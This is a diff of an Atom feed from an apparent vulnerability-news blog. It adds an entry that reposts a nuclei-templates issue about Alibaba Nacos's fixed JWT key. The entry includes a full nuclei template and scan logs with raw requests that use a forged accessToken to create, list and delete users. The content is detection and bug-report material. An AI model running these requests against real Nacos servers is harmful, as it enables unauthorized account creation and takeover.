@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-01T09:00:25.036Z</updated>
+  <updated>2025-07-01T09:30:17.225Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Alibaba Nacos 未授权账户创建漏洞</title>
+    <link href="http://example.com/2025/07/01/github_3480537784/"/>
+    <id>http://example.com/2025/07/01/github_3480537784/</id>
+    <published>2025-07-01T09:30:17.230Z</published>
+    <updated>2025-07-01T09:30:17.225Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Alibaba Nacos 未授权账户创建漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Nacos在默认配置中使用固定的JWT令牌密钥来认证用户。由于Nacos是一个开源项目，密钥是公开的，因此未经授权的攻击者可以使用这个固定的密钥伪造任何用户身份登录Nacos，以管理和操作后台接口功能。</p><p><strong>产品厂商：</strong> Alibaba</p><p><strong>产品名称：</strong> Nacos</p><p><strong>搜索语法：</strong> title:”Nacos”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12508">https://github.com/projectdiscovery/nuclei-templates/issues/12508</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Template-IDs-or-paths"><a href="#Template-IDs-or-paths" class="headerlink" title="Template IDs or paths"></a>Template IDs or paths</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> /http/misconfiguration/nacos/nacos-create-user.yaml<br><span class="hljs-bullet">-</span> nacos-create-user<br></code></pre></td></tr></table></figure><h4 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> OS: Ubuntu 24.04<br><span class="hljs-bullet">-</span> Nuclei: v3.4.6<br><span class="hljs-bullet">-</span> Go: 1.24.2<br></code></pre></td></tr></table></figure><h4 id="Steps-To-Reproduce"><a href="#Steps-To-Reproduce" class="headerlink" title="Steps To Reproduce"></a>Steps To Reproduce</h4><p>The three URLs in this template were not executed in a top-down order but rather in the sequence DELETE -&gt; GET -&gt; POST. This resulted in a failure to successfully detect the Nacos unauthorized access vulnerability during the scan, leading to the incorrect conclusion that Nacos had authentication and authorization enabled.</p><p>Please refer to the scan logs.</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix">nuclei <span class="hljs-operator">-</span>u <span class="hljs-string">&quot;http://127.0.0.1:8848&quot;</span> <span class="hljs-operator">-</span>t <span class="hljs-symbol">./http/misconfiguration/nacos/nacos-create-user.yaml</span> <span class="hljs-operator">-</span>v<br><br>                     __     _<br>   ____  __  _______<span class="hljs-symbol">/</span> <span class="hljs-symbol">/__</span>  (_)<br>  <span class="hljs-symbol">/</span> __ \<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> ___<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> _ \<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span><br> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>__<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  __<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span><br><span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-operator">/</span>\__,_<span class="hljs-operator">/</span>\___<span class="hljs-operator">/</span>_<span class="hljs-operator">/</span>\___<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>   v3.<span class="hljs-number">4.6</span><br><br>                projectdiscovery.io<br><br>[VER] Started metrics server at localhost:<span class="hljs-number">9092</span><br>[WRN] Found <span class="hljs-number">1</span> template[s] loaded <span class="hljs-keyword">with</span> deprecated paths, update before v3 for continued support.<br>[INF] Current nuclei <span class="hljs-params">version:</span> v3.<span class="hljs-number">4.6</span> (latest)<br>[INF] Current nuclei-templates <span class="hljs-params">version:</span> v10.<span class="hljs-number">2.3</span> (latest)<br>[WRN] Scan results upload to cloud is disabled.<br>[INF] New templates added <span class="hljs-keyword">in</span> latest <span class="hljs-params">release:</span> <span class="hljs-number">105</span><br>[INF] Templates loaded for current <span class="hljs-params">scan:</span> <span class="hljs-number">1</span><br>[INF] Executing <span class="hljs-number">1</span> signed templates from projectdiscovery<span class="hljs-symbol">/nuclei-templates</span><br>[INF] Targets loaded for current <span class="hljs-params">scan:</span> <span class="hljs-number">1</span><br>[VER] Skipped <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8848</span> from target list as found unresponsive <span class="hljs-params">permanently:</span> Delete <span class="hljs-string">&quot;http://127.0.0.1:8848/nacos/v1/auth/users/?username=2zGd1vF0LtXrrCJS7nzyRkEwhgX&amp;accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g&quot;</span>: cause<span class="hljs-operator">=</span><span class="hljs-string">&quot;port closed or filtered&quot;</span> address<span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8848</span> chain<span class="hljs-operator">=</span><span class="hljs-string">&quot;connection refused&quot;</span><br>[VER] Skipped <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8848</span> from target list as found unresponsive <span class="hljs-params">permanently:</span> Post <span class="hljs-string">&quot;http://127.0.0.1:8848/nacos/v1/auth/users/?username=2zGd1vF0LtXrrCJS7nzyRkEwhgX&amp;password=2zGd1pEpXJQp75pTIl9Y5oYZRuy&amp;accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g&quot;</span>: cause<span class="hljs-operator">=</span><span class="hljs-string">&quot;port closed or filtered&quot;</span> address<span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8848</span> chain<span class="hljs-operator">=</span><span class="hljs-string">&quot;connection refused&quot;</span><br>[WRN] [nacos-create-user] Could not execute request for http:<span class="hljs-operator">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8848</span>: Delete <span class="hljs-string">&quot;http://127.0.0.1:8848/nacos/v1/auth/users/?username=2zGd1vF0LtXrrCJS7nzyRkEwhgX&amp;accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g&quot;</span>: cause<span class="hljs-operator">=</span><span class="hljs-string">&quot;port closed or filtered&quot;</span> address<span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8848</span> chain<span class="hljs-operator">=</span><span class="hljs-string">&quot;connection refused&quot;</span>; Post <span class="hljs-string">&quot;http://127.0.0.1:8848/nacos/v1/auth/users/?username=2zGd1vF0LtXrrCJS7nzyRkEwhgX&amp;password=2zGd1pEpXJQp75pTIl9Y5oYZRuy&amp;accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g&quot;</span>: cause<span class="hljs-operator">=</span><span class="hljs-string">&quot;port closed or filtered&quot;</span> address<span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8848</span> chain<span class="hljs-operator">=</span><span class="hljs-string">&quot;connection refused&quot;</span><br>[INF] Scan completed <span class="hljs-keyword">in</span> <span class="hljs-number">1.617762</span>ms. No results found.<br></code></pre></td></tr></table></figure><h4 id="Relevant-dumped-responses"><a href="#Relevant-dumped-responses" class="headerlink" title="Relevant dumped responses"></a>Relevant dumped responses</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p>I adjusted the template</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">nacos-create-user</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Alibaba</span> <span class="hljs-string">Nacos</span> <span class="hljs-bullet">-</span> <span class="hljs-string">Unauthorized</span> <span class="hljs-string">Account</span> <span class="hljs-string">Creation</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">SleepingBag945</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    Nacos uses a fixed JWT token key to authenticate users in the default configuration. Since Nacos is an open source project, the key is publicly known, so unauthorized attackers can use this fixed key to forge any user identity Log in to Nacos to manage and operate background interface functions.</span><br><span class="hljs-string"></span>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/nacos-token-create-user.yaml</span><br>  <span class="hljs-attr">classification:</span><br>    <span class="hljs-attr">cpe:</span> <span class="hljs-string">cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*</span><br>  <span class="hljs-attr">metadata:</span><br>    <span class="hljs-attr">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">max-request:</span> <span class="hljs-number">3</span><br>    <span class="hljs-attr">vendor:</span> <span class="hljs-string">alibaba</span><br>    <span class="hljs-attr">product:</span> <span class="hljs-string">nacos</span><br>    <span class="hljs-attr">shodan-query:</span> <span class="hljs-string">title:&quot;Nacos&quot;</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">misconfig,nacos,unauth,bypass,instrusive</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /nacos/v1/auth/users/?username=&#123;&#123;randstr_1&#125;&#125;&amp;password=&#123;&#123;randstr_2&#125;&#125;&amp;accessToken=&#123;&#123;token&#125;&#125; HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span>    <span class="hljs-attr">payloads:</span><br>      <span class="hljs-attr">token:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g</span><br>    <span class="hljs-attr">attack:</span> <span class="hljs-string">pitchfork</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">dsl</span><br>        <span class="hljs-attr">dsl:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">status_code</span> <span class="hljs-string">==</span> <span class="hljs-number">200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">contains(body,</span> <span class="hljs-string">&#x27;create user ok!&#x27;</span><span class="hljs-string">)</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        GET /nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&amp;accessToken=&#123;&#123;token&#125;&#125; HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span>    <span class="hljs-attr">payloads:</span><br>      <span class="hljs-attr">token:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g</span><br>    <span class="hljs-attr">attack:</span> <span class="hljs-string">pitchfork</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">dsl</span><br>        <span class="hljs-attr">dsl:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">status_code</span> <span class="hljs-string">==</span> <span class="hljs-number">200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">contains(body,</span> <span class="hljs-string">&#x27;&#123;&#123;randstr_1&#125;&#125;&#x27;</span><span class="hljs-string">)</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        DELETE /nacos/v1/auth/users/?username=&#123;&#123;randstr_1&#125;&#125;&amp;accessToken=&#123;&#123;token&#125;&#125; HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span>    <span class="hljs-attr">payloads:</span><br>      <span class="hljs-attr">token:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g</span><br>    <span class="hljs-attr">attack:</span> <span class="hljs-string">pitchfork</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">dsl</span><br>        <span class="hljs-attr">dsl:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">status_code</span> <span class="hljs-string">==</span> <span class="hljs-number">200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">contains(body,</span> <span class="hljs-string">&#x27;delete user ok!&#x27;</span><span class="hljs-string">)</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Alibaba Nacos 未授权账户创建漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
   
   <entry>
     <title>vBulletin 认证绕过漏洞</title>
@@ -37,9 +64,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
@@ -114,9 +141,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
@@ -141,9 +168,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
@@ -193,9 +220,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
@@ -519,33 +546,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CNVD漏洞周报2025年第24期</title>
-    <link href="http://example.com/2025/07/01/weixin_2962828534/"/>
-    <id>http://example.com/2025/07/01/weixin_2962828534/</id>
-    <published>2025-07-01T06:06:20.585Z</published>
-    <updated>2025-07-01T06:06:20.580Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 国家互联网应急中心CNCERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/-xkfO16QamR8LGHgWgNZHg">https://mp.weixin.qq.com/s/-xkfO16QamR8LGHgWgNZHg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 国家互联网应急中心CNCERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-xkfO16QamR8LGHgWgNZHg&quot;&gt;https://mp.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
     
   </entry>
   
